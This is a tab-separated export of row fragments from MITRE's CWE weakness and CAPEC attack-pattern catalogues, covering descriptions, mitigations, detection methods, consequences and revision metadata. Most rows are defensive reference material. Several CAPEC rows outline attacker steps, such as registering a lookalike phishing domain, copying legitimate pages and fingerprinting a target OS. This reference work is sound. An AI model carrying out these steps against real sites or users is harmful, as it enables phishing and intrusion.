21134	27	The adversary needs to have enough access to the target application to control the identity of a locally included file. The attacker may also need to be able to upload arbitrary code files to the target machine, although any location for these files may be acceptable.
10726	35	MITRE
16071	56	ChildOf
22544	39	2012-10-30
15604	31	699
5660	101	CAPEC Content Team
14990	43	Simple
12168	28	CWE Content Team
23628	87	Web Server
19490	86	http://www.webappsec.org/projects/threat/classes/xpath_injection.shtml
17358	39	2017-11-08
24118	28	CWE Content Team
14822	35	MITRE
9103	23	The software does not properly handle when the expected number of values for parameters, fields, or arguments is not provided in input, or if those values are undefined.
7260	35	MITRE
6181	56	ChildOf
24542	62	updated Demonstrative_Examples
10926	28	CWE Content Team
19632	35	MITRE
6777	47	Unreliable Execution
21778	45	Base
12281	21	CWE Content Team
6553	74	1
7101	97	Session Credential Falsification through Manipulation
11613	78	Medium
14296	62	updated Relationships
13965	103	Primary
20747	28	CWE Content Team
13892	103	Primary
7528	28	CWE Content Team
22372	28	CWE Content Team
11218	62	updated Relationships, Taxonomy_Mappings
18026	79	Non-Repudiation
9078	81	Other
19970	35	MITRE
20846	24	MITRE
22421	63	Read Application Data
20846	96	2012-12-21
8612	50	Pick a robust implementation of an XML parser.
21795	80	Basic understanding of XQuery
10228	69	Stable
11293	73	Search for uncommon or potentially user created directories that may be present.
12753	43	Simple
13398	39	2008-09-08
7796	47	Hide Activities
23545	39	2008-09-08
15690	83	v3
19217	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Host Application Interface Scanner                                                                     Cost effective for partial coverage:                                                                           Fuzz Tester                            Framework-based Fuzzer                            Automated Monitored Execution                            Forced Path Execution
20481	35	KDM Analytics
9308	35	MITRE
20116	53	The MITRE Corporation
20381	85	42
6453	63	Bypass Protection Mechanism
6589	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
6563	39	2012-10-30
19003	39	2009-10-29
20220	74	2
10795	69	Draft
23539	62	updated Common_Consequences
6005	39	2012-05-11
15791	62	updated Demonstrative_Examples
15619	35	Veracode
16591	77	Automated Dynamic Analysis
25197	53	The MITRE Corporation
9304	26	Implementation
23206	39	2008-09-08
23184	69	Draft
7919	63	DoS: Crash, Exit, or Restart
8546	23	The software uses a storable data element that does not have      all of the associated functions or methods that are necessary to support      comparison.
12777	76	2017-05-01
24449	57	Resultant
19601	39	2011-06-01
10121	85	21
20887	45	Variant
20646	39	2017-11-08
20655	28	CWE Content Team
13842	57	Primary
24513	53	The MITRE Corporation
10011	46	While the expiration of keys does not necessarily ensure that they are compromised, it is a significant concern that keys which remain in use for prolonged periods of time have a decreasing probability of integrity. For this reason, it is important to replace keys within a period of time proportional to their strength.
22613	28	CWE Content Team
19414	63	Reduce Maintainability
5829	28	CWE Content Team
13341	51	2014-06-23
23379	63	Other
24958	35	MITRE
18821	88	Incorrect Regular Expression
10978	35	MITRE
5758	96	2013-06-23
9760	62	updated Potential_Mitigations
24680	62	updated Name, Potential_Mitigations
9620	26	Architecture and Design
15055	28	CWE Content Team
11360	96	2018-07-02
24366	85	412
20859	35	MITRE
19889	62	updated Description, Name
8282	100	The MITRE Corporation
15031	28	CWE Content Team
19872	27	Ability to send HTTP request to a web application
21152	59	Updated Taxonomy_Mappings
16057	40	An underlying weaknesses exists either in the cryptographic algorithm used or in the way that it was applied to a particular chunk of plaintext.
16005	55	CAPEC Content Team
9095	43	Simple
19373	102	ChildOf
19328	62	updated Time_of_Introduction
16766	67	High
12905	47	Bypass Protection Mechanism
15145	35	MITRE
21645	103	Primary
6376	59	Updated Attack_Prerequisites, Description Summary, Resources_Required
18872	28	CWE Content Team
22914	62	updated Potential_Mitigations
18573	69	Draft
13435	62	updated Potential_Mitigations
8459	66	Exploiting Uninitialized Data
12400	47	Read Data
18343	69	Draft
22446	62	updated Common_Consequences, Relationships
21126	43	Simple
14455	28	CWE Content Team
12221	61	Draft
7465	76	2018-07-31
10710	34	Common examples occur in file archive extraction, in which the product begins the extraction with insecure default permissions, then only sets the final permissions (as specified in the archive) once the copy is complete. The larger the archive, the larger the timing window for the race condition.                   This weakness has also occurred in some operating system utilities that perform copies of deeply nested directories containing a large number of files.                   This weakness can occur in any type of functionality that involves copying objects or resources in a multi-user environment, including at the application level. For example, a document management system might allow a user to copy a private document, but if it does not set the new copy to be private as soon as the copy begins, then other users might be able to view the document while the copy is still taking place.
19160	35	MITRE
8009	35	MITRE
18895	39	2012-10-30
11874	35	MITRE
24837	35	MITRE
13758	42	Developers should anticipate that trailing special elements will be injected/removed/manipulated in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
8567	103	Primary
5680	39	2009-03-10
13509	81	Access Control
16332	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
20295	45	Class
8807	62	updated Relationships
24888	35	MITRE
22021	28	CWE Content Team
14360	62	updated Relationships, Taxonomy_Mappings
15743	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
20958	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
6879	35	MITRE
6547	55	CAPEC Content Team
11435	28	CWE Content Team
9042	63	Quality Degradation
13251	35	MITRE
10488	88	Use of Potentially Dangerous Function
22980	35	MITRE
22978	75	These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules. However, manual efforts might not achieve desired code coverage within limited time constraints.
10955	79	Access Control
17200	39	2019-01-03
22851	43	Simple
24717	31	1000
14178	62	updated Relationships, Type
13811	99	Microsoft
15628	39	2019-06-20
21183	39	2008-09-08
20967	81	Confidentiality
12115	35	MITRE
12696	62	updated Relationships
17732	43	Simple
10325	35	MITRE
10304	62	updated Potential_Mitigations
15640	81	Integrity
13864	103	Primary
24516	102	ChildOf
18612	46	Attackers can read the information by accessing the registry key. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information.
24909	31	699
17961	28	CWE Content Team
23636	48	08
6568	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
12315	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
19849	63	Varies by Context
24937	35	MITRE
24239	42	Recommendations include removing any CVS directories and repositories from the production server, disabling the use of remote CVS repositories, and ensuring that the latest CVS patches and version updates have been performed.
20443	95	[Identify SOAP messages that have multiple state processing.] Inspect instance to see whether the XML processing has multiple stages or not.
8796	79	Other
24828	39	2012-05-11
21605	101	CAPEC Content Team
20025	39	2014-07-30
16266	62	updated Common_Consequences, Demonstrative_Examples, Observed_Examples, References, Relationships
20086	62	updated Description, Maintenance_Notes, Other_Notes
20651	28	CWE Content Team
15259	35	MITRE
12603	26	Implementation
8004	88	Insecure Inherited Permissions
24736	91	Implementation
7210	92	Explore
19169	62	updated Relationships
22509	35	MITRE
16726	94	A successful attack that probes application memory will compromise the confidentiality of that data.
13811	48	08
21171	35	MITRE
11882	23	The application uses a protection mechanism that relies on the existence or values of an input, but the input can be modified by an untrusted actor in a way that bypasses the protection mechanism.
13829	103	Primary
20172	39	2009-07-27
8356	39	2008-10-14
22902	73	Optionally obtain a domain name that visually looks similar to the legitimate site's domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i, instead of a lower case L).
10384	97	Forceful Browsing
21009	56	ChildOf
10505	81	Integrity
22311	88	Relative Path Traversal
25142	28	CWE Content Team
17897	63	DoS: Crash, Exit, or Restart
9075	104	330
18828	62	updated Relationships
20884	44	High
17041	62	updated Common_Consequences, Demonstrative_Examples, Detection_Factors, Likelihood_of_Exploit, Observed_Examples, Potential_Mitigations, Time_of_Introduction
10275	77	Automated Static Analysis - Source Code
21737	21	PLOVER
15309	22	08
15769	35	MITRE
22744	38	Many incorrect attempts to answer the security question.
5904	62	updated Potential_Mitigations, Time_of_Introduction
6472	46	The sensitive memory might be saved to disk, stored in a core dump, or remain uncleared if the application crashes, or if the programmer does not properly clear the memory before freeing it.             It could be argued that such problems are usually only exploitable by those with administrator privileges. However, swapping could cause the memory to be written to disk and leave it accessible to physical attack afterwards. Core dump files might have insecure permissions or be stored in archive files that are accessible to untrusted people. Or, uncleared sensitive memory might be inadvertently exposed to attackers due to another weakness.
14131	35	MITRE
16606	28	CWE Content Team
9759	39	2017-11-08
24370	76	2017-01-09
11770	42	Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.
5595	80	The attacker needs to have knowledge of observing the protocol exchange and managing the required connections in order to issue and respond to challenges
17925	22	07
9955	42	Follow the principle of least privilege when assigning access rights to entities in a software system.
20522	28	Eric Dalci
22500	26	Implementation
18780	39	2019-01-03
12415	28	CWE Content Team
6743	61	Draft
7646	28	CWE Content Team
5967	71	2011
16666	100	The MITRE Corporation
15309	30	J. Postel
20375	62	updated Relationships
12517	35	MITRE
15049	35	MITRE
24459	31	1003
8818	95	The adversary triggers a first action (such as holding a resource) and initiates a second action which will wait for the first one to finish.
18216	43	Simple
14824	28	CWE Content Team
9966	50	To help protect an application from buffer manipulation attacks, a number of potential mitigations can be leveraged. Before starting the development of the application, consider using a code language (e.g., Java) or compiler that limits the ability of developers to act beyond the bounds of a buffer. If the chosen language is susceptible to buffer related issues (e.g., C) then consider using secure functions instead of those vulnerable to buffer manipulations. If a potentially dangerous function must be used, make sure that proper boundary checking is performed. Additionally, there are often a number of compiler-based mechanisms (e.g., StackGuard, ProPolice and the Microsoft Visual Studio /GS flag) that can help identify and protect against potential buffer issues. Finally, there may be operating system level preventative functionality that can be applied.
11464	31	1000
22620	92	Explore
16180	28	CWE Content Team
24849	91	Implementation
23106	80	No programming skills or computer knowledge is needed. An attacker can easily use this attack pattern following the Execution Flow above.
6107	31	699
12866	42	Use an appropriate security mechanism to protect the credentials.
21092	50	Employ a robust network defense posture that includes an IDS/IPS system.
12030	103	Primary
8253	26	Implementation
12288	85	66
19902	53	The MITRE Corporation
13005	62	updated Description, Other_Notes
24005	44	High
23044	89	Standard
19729	48	11
20669	28	CWE Content Team
7958	76	2018-07-31
20697	81	Confidentiality
7015	35	MITRE
10737	42	Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.
13335	28	Eric Dalci
19156	45	Variant
13386	39	2008-11-24
13131	35	MITRE
10382	92	Experiment
15423	35	MITRE
12722	39	2008-10-14
14120	28	CWE Content Team
11987	67	Low
18992	80	Knowledge of various escaping schemes, such as URL escape encoding and XML escape characters.
19382	35	MITRE
13417	62	updated Relationships
17009	81	Integrity
8495	35	Cigital
18055	39	2009-05-27
22714	28	CWE Content Team
13687	24	MITRE
10904	35	MITRE
5675	62	updated Common_Consequences
7789	35	MITRE
13128	76	2019-09-30
22036	83	Draft NISTIR 7622
13747	62	updated Common_Consequences, Description, Maintenance_Notes, Name
6092	26	Implementation
13545	31	1000
12388	39	2014-07-30
20980	26	Implementation
24029	35	MITRE
18810	28	CWE Content Team
22148	62	updated Potential_Mitigations
18602	79	Integrity
10225	73	Look for delimiters or other indicators of structure
9428	39	2010-02-16
6010	28	CWE Content Team
7909	71	2014
13339	59	Updated Consequences
15902	50	To limit one's exposure to this type of attack, developers should avoid exporting components unless the component is specifically designed to handle requests from untrusted applications. Developers should be aware that declaring an intent filter will automatically export the component, exposing it to public access. Critical, state-changing actions should not be placed in exported components. If a single component handles both inter- and intra-application requests, the developer should consider dividing that component into separate components. If a component must be exported (e.g., to receive system broadcasts), then the component should dynamically check the caller's identity prior to performing any operations. Requiring Signature or SignatureOrSystem permissions is an effective way of limiting a component's exposure to a set of trusted applications. Finally, the return values of exported components can also leak private data, so developers should check the caller's identity prior to returning sensitive values.
11012	39	2014-07-30
18089	28	CWE Content Team
21882	73	Use a browser to manually explore the website and analyze how the application processes XML requests.
8294	31	1000
9483	63	Gain Privileges or Assume Identity
16249	35	MITRE
9343	28	CWE Content Team
8359	59	Updated Related_Attack_Patterns
17844	68	An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.
8948	35	Cigital
5894	62	updated Potential_Mitigations
18820	100	The MITRE Corporation
21506	26	Architecture and Design
10373	39	2009-03-10
9432	39	2014-07-30
14328	44	High
16349	101	CAPEC Content Team
19648	62	updated Time_of_Introduction
6900	91	Operation
17146	91	Implementation
11645	61	Draft
11416	39	2017-11-08
17772	28	CWE Content Team
10268	35	MITRE
24208	100	The MITRE Corporation
25146	103	Primary
12155	35	MITRE
23501	63	DoS: Crash, Exit, or Restart
6137	70	Share Library Call Redirection Via ELF PLT Infection
21538	94	Disabling a network route denies the availability of a service.
6936	50	Make sure that HTTPS is used to communicate with the target system. Alternatively, use VPN if possible. It is important to ensure that all communication between the client and the server happens via an encrypted secure channel.
19415	28	CWE Content Team
23515	47	Bypass Protection Mechanism
18967	42	When the set of filenames is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames, and reject all other inputs. For example, ID 1 could map to "inbox.txt" and ID 2 could map to "profile.txt". Features such as the ESAPI AccessReferenceMap provide this capability.
12280	51	2014-06-23
10171	56	ChildOf
25181	35	MITRE
16188	101	CAPEC Content Team
9840	92	Exploit
21565	28	CWE Content Team
20828	62	updated Observed_Examples
15036	35	MITRE
24280	55	CAPEC Content Team
23287	80	To modify file name or file extension
10000	77	Automated Dynamic Analysis
19294	79	Confidentiality
25315	35	MITRE
19407	62	updated Relationships
10900	62	updated Common_Consequences
14008	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
8374	39	2011-06-01
24953	101	CAPEC Content Team
20495	62	updated Demonstrative_Examples
8118	57	Indirect
16548	39	2019-06-20
10891	90	Language-Independent
17795	51	2014-06-23
18719	74	2
23957	90	C++
9622	68	This is not a complete solution, since buffer overflows could be used to overwrite nearby variables to modify the software's state in dangerous ways. In addition, it cannot be used in cases in which self-modifying code is required. Finally, an attack could still cause a denial of service, since the typical response is to exit the application.
22370	28	CWE Content Team
9394	79	Confidentiality
8985	92	Experiment
7036	63	Bypass Protection Mechanism
17902	43	Simple
14564	62	updated Demonstrative_Examples, Description, References
16048	35	MITRE
11094	62	updated Other_Notes, Relationship_Notes, Research_Gaps
16292	72	When the consequence is arbitrary code execution, this can often be used to subvert any other security service.
14929	28	CWE Content Team
13988	21	PLOVER
14033	103	Primary
8576	28	CWE Content Team
7905	62	updated Relationships, Taxonomy_Mappings
8210	35	MITRE
24748	28	CWE Content Team
24787	81	Integrity
13724	81	Confidentiality
16528	89	Meta
19732	28	Eric Dalci
9233	42	Do not store unnecessarily sensitive information in the cache.
19776	62	updated Related_Attack_Patterns
7051	44	SOAR Partial
24820	39	2010-06-21
25294	39	2019-01-03
9219	63	Bypass Protection Mechanism
10495	42	Limit Content Provider permissions (read/write) as appropriate.
7708	62	updated Modes_of_Introduction, Other_Notes, Potential_Mitigations
25404	81	Other
23173	59	Updated Related_Attack_Patterns
20626	21	CWE Content Team
8177	97	Probe iOS Screenshots
12360	90	Language-Independent
7494	28	CWE Content Team
11912	91	Implementation
8542	47	Other
19667	63	Modify Memory
14736	63	Read Application Data
16640	28	CWE Content Team
10672	104	1092
20614	62	updated Applicable_Platforms, Common_Consequences, Description, Relationships, Other_Notes, Taxonomy_Mappings
8961	28	CWE Content Team
11406	103	Primary
10592	39	2019-01-03
20891	88	Exposure of Data Element to Wrong Session
11645	97	XPath Injection
12102	102	ChildOf
25293	50	Use synchronization to control the flow of execution.
9226	35	MITRE
24448	81	Confidentiality
7455	88	Double Decoding of the Same Data
7007	53	The MITRE Corporation
18069	62	updated Demonstrative_Examples, Description, Name, Observed_Examples, Other_Notes, Potential_Mitigations, Relationships, Time_of_Introduction
18429	45	Class
14256	39	2009-03-10
20617	28	CWE Content Team
19985	51	2014-06-23
21908	90	Java
8112	103	Primary
23635	42	In flat address space situations, never allow computing memory addresses as offsets from another memory address.
18343	45	Base
17598	62	updated Relationships
15677	39	2011-09-13
19858	81	Integrity
14663	62	updated Common_Consequences
21996	22	04
14997	95	Adversary determines the underlying system thread that is subject to user-control
20381	50	Disable the 7 to 8 bit conversion. This can be done by removing the F=9 flag from all Mailer specifications in the sendmail.cf file.                For example, a sendmail.cf file with these changes applied should look similar to (depending on your system and configuration):                Mlocal, P=/usr/libexec/mail.local, F=lsDFMAw5:/|@qrmn, S=10/30, R=20/40,T=DNS/RFC822/X-Unix,A=mail -d $u                   Mprog, P=/bin/sh, F=lsDFMoqeu, S=10/30, R=20/40,D=$z:/,T=X-Unix,A=sh -c $u                                This can be achieved for the "Mlocal" and "Mprog" Mailers by modifying the ".mc" file to include the following lines:                define(`LOCAL_MAILER_FLAGS',ifdef(`LOCAL_MAILER_FLAGS',`translit(LOCAL_MAILER_FLAGS, `9')',`rmn'))                                      define(`LOCAL_SHELL_FLAGS',ifdef(`LOCAL_SHELL_FLAGS',`translit(LOCAL_SHELL_FLAGS, `9')',`eu'))                                                   and then rebuilding the sendmail.cf file using m4(1).                From "Exploiting Software", please see reference below.
21544	39	2008-10-14
20368	62	updated Relationships
12406	76	2018-07-31
13311	103	Primary
9944	103	Primary
6201	74	1
22273	62	updated Applicable_Platforms, Demonstrative_Examples, Relationships, Type
19886	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
8243	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Context-configured Source Code Weakness Analyzer
18318	39	2009-12-28
24031	62	updated Common_Consequences
12164	94	Denial of Service
19299	61	Draft
10415	39	2017-11-08
6847	21	PLOVER
13612	95	[Identification] Using a browser or an automated tool, an attacker records all instances of URLs (or partial URL such as domain) passed to a flash file (SWF).
14311	59	Updated Related_Attack_Patterns
24499	101	CAPEC Content Team
7799	62	updated Relationships
21976	35	Cigital
16891	35	MITRE
18727	72	If security critical information is not recorded, there will be no trail for forensic analysis and discovering the cause of problems or the source of attacks may become more difficult or impossible.
13475	101	CAPEC Content Team
6993	79	Access Control
8159	97	Hardware Integrity Attack
17515	71	2004
19729	86	https://securityblog.redhat.com/2012/11/28/position-independent-executables-pie/
14677	23	The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes NUL characters or null bytes when they are sent to a downstream component.
11514	61	Stable
16576	62	updated Applicable_Platforms
21750	39	2017-11-08
6712	35	MITRE
17480	28	CWE Content Team
25363	94	A successful Stored XSS attack can enable an adversary to elevate their privilege level and access functionality they should not otherwise be allowed to access.
19643	28	CWE Content Team
17031	26	Architecture and Design
19880	81	Integrity
22507	39	2017-11-08
13154	91	Architecture and Design
20197	59	Updated Attack_Prerequisites, Description Summary, Related_Attack_Patterns
12758	43	Simple
12300	21	CWE Content Team
14012	62	updated Potential_Mitigations, Time_of_Introduction
12945	85	545
20588	45	Base
18341	91	Distribution
18503	81	Access Control
12748	95	The attacker finds an integer variable that he can write into or manipulate and try to get the value of the integer out of the possible range.
6922	39	2009-07-27
22280	35	MITRE
14949	63	DoS: Resource Consumption (Memory)
15495	28	CWE Content Team
11374	47	Modify Data
20381	89	Detailed
24624	31	1000
10424	31	1000
23204	39	2014-06-23
8238	60	14
20199	62	updated Description, Name
9567	62	updated Relationships, Taxonomy_Mappings
14232	33	Kim Zetter
19688	39	2014-06-23
16471	42	If available, use the signing/sealing features of the programming language to assure that deserialized data has not been tainted. For example, a hash-based message authentication code (HMAC) could be used to ensure that data has not been modified.
12187	97	Timestamp Request
11747	62	updated Potential_Mitigations, Related_Attack_Patterns
23977	62	updated Potential_Mitigations
13288	103	Primary
13332	56	ChildOf
22472	90	Language-Independent
20547	31	699
22316	45	Variant
12267	28	Sean Eidemiller
7783	63	Execute Unauthorized Code or Commands
8218	57	Primary
6622	39	2012-10-30
19176	101	CAPEC Content Team
23497	28	CWE Content Team
22009	67	Medium
12853	81	Confidentiality
16262	28	Sean Eidemiller
6165	69	Incomplete
19377	51	2014-06-23
6000	55	Seamus Tuohy
15875	97	Information Elicitation
14857	51	2014-06-23
16268	91	Architecture and Design
20918	39	2012-05-11
24928	95	[Fingerprinting of the operating system] In order to create a valid file injection, the attacker needs to know what the underlying OS is.
6627	100	The MITRE Corporation
19021	45	Variant
7998	25	Medium
19022	62	updated Other_Notes, Theoretical_Notes
6973	88	Information Exposure Through Discrepancy
8626	62	updated Common_Consequences
10907	39	2009-05-27
15678	91	Architecture and Design
21481	39	2012-05-11
6038	39	2011-06-01
7165	35	MITRE
14906	28	CWE Content Team
7492	62	updated Relationships, Type
12283	62	updated Relationships, Taxonomy_Mappings
11242	39	2017-05-03
10271	25	High
6451	62	updated Relationships
18702	39	2009-10-29
12535	36	http://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OWASP-DV-002)
9689	62	updated Description, Potential_Mitigations
16816	28	CWE Content Team
24539	28	CWE Content Team
23775	66	Guide to Authentication
6605	56	ChildOf
21415	62	updated Common_Consequences
22603	62	updated Potential_Mitigations, References, Relationships
7202	81	Other
11499	50	A given code signing scheme may be fallible due to improper use of cryptography. Developers must never roll out their own cryptography, nor should existing primitives be modified or ignored.
8312	81	Other
20804	72	Data that is parsed and used may be corrupted.
10088	28	Eric Dalci
17708	28	CWE Content Team
24841	90	Language-Independent
5705	39	2009-12-28
21428	28	CWE Content Team
15437	35	MITRE
5690	35	MITRE
21414	35	Cigital
12495	62	updated Applicable_Platforms, Time_of_Introduction
16696	39	2008-11-24
8558	56	ChildOf
11348	54	High
18759	62	updated Description
5802	90	C
14325	88	Suspicious Comment
14279	39	2014-07-30
14186	92	Explore
22588	88	Uncontrolled Memory Allocation
15626	40	The command-line utility exposed by the target host has a buffer overflow vulnerability that can be exploited.
22597	42	Run or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code.                   Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64].
20781	76	2019-04-04
11228	66	The Oracle Hacker's Handbook: Hacking and Defending Oracle
15750	89	Detailed
20997	69	Draft
9343	35	MITRE
8594	47	Read Data
22142	85	618
7941	53	The MITRE Corporation
19733	35	MITRE
12602	35	MITRE
17117	89	Standard
12668	45	Base
18687	39	2010-04-05
22291	28	CWE Content Team
24886	35	MITRE
12951	28	CWE Content Team
20387	56	CanPrecede
19033	53	The MITRE Corporation
19266	36	http://u.cs.biu.ac.il/~herzbea/security/12-03%20fragmentation.pdf
16272	39	2012-05-11
24979	39	2017-05-03
6205	51	2014-06-23
6715	56	ChildOf
18034	28	CWE Content Team
16379	23	This attack targets the WSDL interface made available by a web service. The attacker may scan the WSDL interface to reveal sensitive information about invocation patterns, underlying technology implementations and associated vulnerabilities. This type of probing is carried out to perform more serious attacks (e.g. parameter tampering, malicious content injection, command injection, etc.). WSDL files provide detailed information about the services ports and bindings available to consumers. For instance, the attacker can submit special characters or malicious content to the Web service and can cause a denial of service condition or illegal access to database records. In addition, the attacker may try to guess other private methods by using the information provided in the WSDL files.
15512	35	MITRE
9690	35	MITRE
22483	35	MITRE
24835	62	updated Potential_Mitigations, Time_of_Introduction
24378	81	Other
14730	59	Updated Related_Weaknesses
13795	35	MITRE
23114	91	Implementation
15635	90	Language-Independent
24060	39	2011-06-27
16855	28	CWE Content Team
23614	35	MITRE
17889	45	Base
11548	62	added/updated demonstrative examples
7326	59	Updated Related_Weaknesses
14098	35	MITRE
6729	62	updated Applicable_Platforms, Description, Name, Relationships, Type
7907	56	ChildOf
22835	39	2017-11-08
21936	35	MITRE
6793	53	The MITRE Corporation
15660	35	Veracode
8328	62	updated Time_of_Introduction
22981	59	Updated Related_Attack_Patterns
18342	56	ChildOf
22580	31	699
14083	35	MITRE
9698	62	updated Applicable_Platforms, Description
12095	72	This weakness could be an indication of a bug in the program or a deprecated variable that was not removed and is an indication of poor quality. This could lead to further bugs and the introduction of weaknesses.
21979	60	26
7332	30	Markus Kuhn
10212	39	2009-03-10
15857	28	CWE Content Team
10237	28	CWE Content Team
10442	28	CWE Content Team
22273	35	MITRE
17100	54	High
7310	94	Information Leakage
18366	21	Anonymous Tool Vendor (under NDA)
15397	39	2019-06-20
14472	35	MITRE
21493	35	MITRE
15961	62	updated Related_Attack_Patterns, Relationships, Type
5873	39	2008-09-08
8955	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Web Application Scanner                            Web Services Scanner                            Database Scanners                                                                     Cost effective for partial coverage:                                                                           Host-based Vulnerability Scanners – Examine configuration for flaws, verifying that audit mechanisms work, ensure host configuration meets certain predefined criteria
15161	55	CAPEC Content Team
21559	103	Primary
13425	62	updated Relationships, Taxonomy_Mappings
20873	39	2008-09-08
18909	32	The Wikimedia Foundation, Inc
10279	79	Confidentiality
16238	62	updated Name, Relationships
9983	28	CWE Content Team
6190	28	CWE Content Team
14394	79	Availability
13910	39	2014-06-23
10230	59	Updated Attack_Prerequisites, Description Summary, Resources_Required
10822	72	A user might retain access to a critical resource even after privileges have been revoked, possibly allowing access to privileged functionality or sensitive information, depending on the role of the resource.
15294	56	ChildOf
11252	35	MITRE
8681	39	2008-11-24
21428	62	updated Common_Consequences
15912	39	2017-11-08
10113	39	2011-06-27
6339	28	Eric Dalci
20766	88	Guessable CAPTCHA
18737	35	MITRE
8740	28	CWE Content Team
5587	35	MITRE
12774	42	Developers should anticipate that special elements will be injected/removed/manipulated in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
9583	33	Object Management Group (OMG)
18021	39	2008-08-01
10036	104	99
21558	35	MITRE
6387	35	MITRE
9163	28	CWE Content Team
18899	100	The MITRE Corporation
16409	62	updated Relationships
21859	88	Floating Point Comparison with Incorrect Operator
13734	35	MITRE
24453	56	ChildOf
22822	35	MITRE
16734	35	Veracode
11566	92	Experiment
15023	28	CWE Content Team
18609	81	Confidentiality
8738	40	This type of an attack requires the ability to generate a large amount of TCP traffic to send to the target port of a functioning server.
7873	77	Automated Static Analysis - Source Code
6919	56	ChildOf
25011	59	Updated References
12694	100	The MITRE Corporation
13302	28	CWE Content Team
9523	40	Server software must rely on client side formatted and validated values, and not reinforce these checks on the server side.
25089	62	updated Description, Relationships
14807	91	Architecture and Design
17768	59	Updated Related_Attack_Patterns
13774	100	The MITRE Corporation
17589	62	updated Name
7847	42	Avoid double-checked locking (CWE-609) and other implementation errors that arise when trying to avoid the overhead of synchronization.
9856	59	Updated Description Summary
12369	35	MITRE
17378	97	Influence via Psychological Principles
19439	73	Manually save copies of required web pages from legitimate site.
23932	35	MITRE
18180	26	Architecture and Design
10582	52	Fuzzing techniques can be useful for detecting input validation errors. When unexpected inputs are provided to the software, the software should not crash or otherwise become unstable, and it should generate application-controlled error messages. If exceptions or interpreter-generated error messages occur, this indicates that the input was not detected and handled within the application logic itself.
16304	26	Implementation
14870	35	MITRE
22941	62	updated Common_Consequences, Observed_Examples, Relationships
24537	46	For example, in C++, "delete this" will cause the object to delete itself.   This issue can prevent the software from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.
10837	35	MITRE
23243	100	The MITRE Corporation
18176	78	Very High
15297	35	MITRE
13328	28	CWE Content Team
12869	69	Draft
17957	59	Updated Related_Attack_Patterns
17521	31	699
13352	42	When you come across an empty synchronized statement, or a synchronized statement in which the code has been commented out, try to determine what the original intentions were and whether or not the synchronized block is still necessary.
23043	62	updated Description, Name, References, Relationships
16184	35	MITRE
18637	33	Johannes Ullrich
19236	35	MITRE
19497	62	updated Common_Consequences
7568	26	Implementation
18849	81	Integrity
12123	39	2018-03-27
20977	35	MITRE
16651	40	The XQL must execute unvalidated data
21812	43	Simple
24204	69	Draft
20825	39	2010-12-13
23646	103	Primary
13904	56	ChildOf
24003	62	updated Description
15903	57	Primary
21136	74	1
7072	52	Identify error conditions that are not likely to occur during normal usage and trigger them. For example, run the program under low memory conditions, run with insufficient privileges or permissions, interrupt a transaction before it is completed, or disable connectivity to basic network services such as DNS. Monitor the software for any unexpected behavior. If you trigger an unhandled exception or similar error that was discovered and handled by the application's environment, it may still indicate unexpected conditions that were not handled by the application itself.
20948	35	MITRE
18117	91	Implementation
12559	100	The MITRE Corporation
12609	28	CWE Content Team
12303	35	MITRE
9749	101	CAPEC Content Team
23241	28	CWE Content Team
6013	35	MITRE
17817	28	CWE Content Team
22173	35	MITRE
8665	28	CWE Content Team
22914	35	MITRE
12855	90	Language-Independent
16602	62	updated Applicable_Platforms, Relationships
7991	61	Stable
13324	28	Eric Dalci
18119	39	2014-07-30
24884	100	The MITRE Corporation
18132	62	updated Relationships
13321	103	Primary
24414	81	Confidentiality
14955	102	ChildOf
10384	27	None: No specialized resources are required to execute this type of attack. A directory listing is helpful, but not a requirement.
6857	35	MITRE
7337	56	ChildOf
21728	101	CAPEC Content Team
13063	45	Base
19911	79	Confidentiality
17697	23	The product performs an indexing routine against private documents, but does not sufficiently verify that the actors who can access the index also have the privileges to access the private documents.
24975	63	Execute Unauthorized Code or Commands
